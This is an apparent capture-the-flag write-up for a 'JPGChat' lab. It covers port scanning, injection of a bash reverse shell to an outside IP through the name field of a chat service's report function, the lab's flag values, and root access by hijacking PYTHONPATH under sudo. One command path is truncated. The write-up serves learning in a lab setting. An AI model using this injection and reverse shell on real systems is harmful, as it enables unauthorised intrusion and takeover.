> JPGChat

**export IP=10.10.142.222**

# Nmap

nmap -sC -sV -T4 -Pn -p- -vv -oN nmap/initial $IP

```
22/tcp    open     ssh          syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
3000/tcp
```

As per the hint, looking for JPChat in github gives us the code.

nc $IP 3000

```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

We can input a basic bash shell in there.

## Payload

```
[REPORT] 
this report will be read by Mozzie-jpg
your name:
troy;bash -i >& /dev/tcp/10.8.107.21/1234 0>&1;
your report:
hi
troy
]
```

And we have a reverse shell!

# user.txt

```
JPC{487030410a543503cbb59ece16178318}
```

# Privilege Escalation

sudo -l

```
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH => Looks odd?

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

## test_module.py

```
from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

Unfortunately this is not writable but let's check the compare.py. 

find / -type f 2>/dev/null | grep compare.py

```
/usr/lib/python3.5/compare.py
/usr/lib/python2.7/dist-packages/lxml/doctestcompare.pyc
/usr/lib/python2.7/dist-packages/lxml/doctestcompare.py
```

Let's creare compare.py in /dev/shm and change the python path to /dev/shm while executing it.

sudo PYTHONPATH=/dev/shm/ /usr/bin/python3 /lopment/test_module.py

And we are root!

# root.txt

```
JPC{665b7f2e59cf44763e5a7f070b081b0a}
```